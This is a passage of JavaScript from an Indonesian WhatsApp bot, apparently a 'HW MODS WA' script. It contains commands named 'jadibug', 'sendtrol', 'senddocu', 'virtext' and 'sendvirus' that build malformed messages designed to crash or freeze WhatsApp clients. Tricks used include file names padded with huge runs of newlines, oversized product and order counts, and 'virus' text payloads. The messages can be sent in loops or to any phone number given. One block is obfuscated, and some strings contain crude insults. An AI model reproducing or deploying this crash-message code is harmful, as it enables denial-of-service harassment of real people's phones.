haikal.relayMessage(from, liveLocation.message, { messageId: liveLocation.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug3': {
if (!isPrem) return replyprem(mess.premium)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
sticSukses(from)
}
}
break

//=================================================//
case 'jadibug4': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug5': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: from })
haikal.relayMessage(from, document.message, { messageId: document.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug6': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug7': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug8': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug9': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug10': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug11': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug12': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug13': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug14': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug15': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(from, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug16': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m })
haikal.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug17' : {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
sticSukses(from)
let teks = `${q}`
{
haikal.relayMessage(from, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `DEVELOPER HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'jadibug18': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
joau = fs.readFileSync('./baseikal/video/haikal.mp4')
haikal.sendMessage(from, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'jadibug19':
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
haikal.sendMessage(from, buttonnnnmMessage)
sticSukses(from)
}
 break
case 'jadibug20': {
if (!isPrem) return replyprem(mess.premium)
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
 var message = {
document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${teks}  ${buttonkal}`,
footer: ` ${teks} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
headerType: 5
}
haikal.sendMessage(from, message, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'sendbuglist':
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
touchmebre = [
{
title: `🌷 HW MODS WA WA 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
haikal.sendListMsg(bnnd, `🌷 HW MODS WA WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
sticSukses(from)
break
//=================================================//
case 'sendtrol':{
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY HW MODS WA",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6281214281312@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
haikal.relayMessage(bnnd, order.message, { messageId: order.key.id })
sticSukses(from)
}
break
//=================================================//
case 'senddocu': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from })
haikal.relayMessage(bnnd, document.message, { messageId: document.key.id })
sticSukses(from)
}
break
//=================================================//
case 'virtext1': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext2': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone1}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext3': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone2}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext4': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone3}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext5': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone4}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext6': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone5}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext7': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${iphone6}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext8': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${buttonkal}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext9': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
}
break
//=================================================//
case 'virtext10': {
if (!isPrem) return replyprem(mess.premium)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(from, { image: ppnyauser,  caption: `HW MODS WA${ngazap(prefix)}`}, { quoted:m })
sticSukses(from)
}
}
break
case 'sendvirus': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus2': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone1}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus3': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone2}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus4': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone3}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus5': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone4}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus6': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone5}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus7': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${iphone6}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus8': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${buttonkal}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus9': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
haikal.sendMessage(bnnd, { image: ppnyauser,  caption: `HW MODS WA${buttonvirus}` }, { quoted:m })
sticSukses(from)
}
break
//=================================================//
case 'sendvirus10': {
if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
